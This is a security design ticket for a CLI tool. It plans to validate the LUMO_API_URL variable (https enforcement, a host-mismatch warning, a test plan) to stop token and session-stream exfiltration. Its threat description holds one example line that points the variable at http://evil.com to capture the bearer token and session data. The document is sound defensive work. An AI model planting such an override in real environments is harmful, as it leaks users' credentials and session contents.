# LUM-138 — Validate `LUMO_API_URL` scheme & host

**Status:** Approved (2026-06-01)
**Severity:** Medium — credential / session-data exfiltration

## Problem

`resolveApiUrl()` (`cli/src/lib/api.ts`), ~50 commands, and `hook-runner.ts:154`
unconditionally accept the `LUMO_API_URL` env var. None enforce `https` or
validate the host. Every authenticated path attaches the `Bearer` token; the
hook runner additionally POSTs each hook body (user prompts, tool inputs, file
diffs, full session stream) to that URL.

**Attack:** anyone able to write a shell profile / direnv `.envrc` / CI env var
injects `LUMO_API_URL=http://evil.com` and silently receives the token and the
entire Claude Code session stream. `http://` also transmits the token in
plaintext.

## Design

Centralize all `LUMO_API_URL` resolution into `cli/src/lib/api.ts`. Three new
pure-ish functions plus hardening of the existing `resolveApiUrl()`:

### `assertSafeApiUrl(url: string): void`
Throws on an unsafe target.
- `new URL(url)` parse failure → throw `Invalid LUMO_API_URL: ...`.
- `https:` → allow.
- `http:` AND hostname ∈ {`localhost`, `127.0.0.1`, `::1`} → allow (dev exception).
- otherwise (remote `http:`, `ftp:`, scheme-less) → throw, explaining the token
  would be sent in plaintext / to an untrusted host.

### `hostMismatchWarning(resolvedUrl, credsApiUrl): string | null`
Pure. Returns a prominent `⚠` warning string when the resolved host differs
(case-insensitive hostname) from the credentials' host; otherwise `null`. Used
to warn-then-send per the task's guidance (not to block).

### `resolveAuthedApiUrl(credsApiUrl, opts?: { warn?: (m: string) => void }): string`
The single entry point for authenticated commands.
1. Resolve `LUMO_API_URL` (trimmed, non-empty) else `credsApiUrl`.
2. `assertSafeApiUrl(resolved)` (throws → caller surfaces).
3. Route `hostMismatchWarning(...)` (if non-null) to `opts.warn ?? console.error`.
4. Return the resolved URL.

### `resolveApiUrl()` (hardened)
Pre-credentials path (`auth login`). Still resolves env-or-DEFAULT, now calls
`assertSafeApiUrl` before returning. No creds → no mismatch warning.

## Call-site changes

- **~50 commands:** replace the inline
  `const envUrl = ...; const apiUrl = envUrl?... : creds.apiUrl` with
  `const apiUrl = resolveAuthedApiUrl(creds.apiUrl)`. A throw is caught by the
  top-level `wrap()` in `index.ts`, which prints `Error: <msg>` and exits 1.
- **`hook-runner.ts`:** `resolveAuthedApiUrl(creds.apiUrl, { warn: m => logHookError(`[${path}]`, m) })`.
  Warnings go to `hook.log` (never stdout — would pollute Claude Code). A throw
  is caught by the existing outer `try/catch`, logged, and the POST is skipped —
  **the hook still exits 0** (never blocks Claude Code).
- **`figma-api.ts`:** `resolveApiUrl()` → `resolveAuthedApiUrl(creds.apiUrl)` (it
  already reads creds and sends the token; gains validation + the warning).

## Behavior matrix

| Scenario | Command | Hook |
|---|---|---|
| `https` / `http` localhost | normal | normal POST |
| remote `http` / invalid URL | `Error:` + exit 1 | log to `hook.log`, skip POST, exit 0 |
| env host ≠ creds host | prominent `⚠` on stderr, **proceeds** | `⚠` to `hook.log`, proceeds |

## Out of scope (YAGNI)

Host allowlist (`LUMO_API_ALLOWED_HOSTS`) — not implemented in v1. The attack
surface is covered by https enforcement + the mismatch warning.

## Tests — `__tests__/cli/api-url-validation.test.ts` (`@jest-environment node`)

- `assertSafeApiUrl`: https allow / http-localhost allow / remote http throw /
  invalid URL throw / ftp throw.
- `hostMismatchWarning`: same host → null / different host → string containing
  both hostnames.
- `resolveAuthedApiUrl`: env override validated + warn fired / no env → creds
  fallback / insecure → throw / custom `warn` sink invoked.
- `resolveApiUrl`: default allow / insecure env → throw.
